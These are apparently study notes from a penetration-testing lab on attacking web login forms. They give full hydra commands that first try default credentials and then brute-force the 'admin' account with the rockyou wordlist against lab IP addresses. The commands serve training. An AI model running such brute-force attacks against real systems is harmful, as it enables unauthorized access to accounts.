---
title: 'Login Form Attacks:'
updated: 2023-08-16T14:27:20.0000000+01:00
created: 2023-08-16T14:10:19.0000000+01:00
---

Activity:

We can login using our hydra the previous hydra line:
![image1](../../../../_resources/image1-185.png)

Once we login using the details:
![image2](../../../../_resources/image2-152.png)

Introduction:

When in a login form attack, it is ideal to look at trying to test the application using **default credentials** first in the **http-post-form** module.

We can do this using the wordlist of **ftp-betterdefaultpasslist.txt**

**hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=\<form name='login'"**

If we test using default creds and don't identify any working credentials, we need to move on to testing using a password wordlist.

Password Wordlist:

Since the brute force attack failed using default creds, we can try brute force the web application. We frequently, want to use usernames like **admin, administrator, wpadmin, root, adm.** Since these names are frequently used in admin panels and are infrequently changed.

The most common username is **admin** and we can test using the admin username:

**hydra -l admin -P** /usr/share/wordlists/rockyou.txt **-f** 94.237.62.195 **-s 35852 http-post-form "/login.php:username=^USER^&password=^PASS^:F=\<form name='login'"**

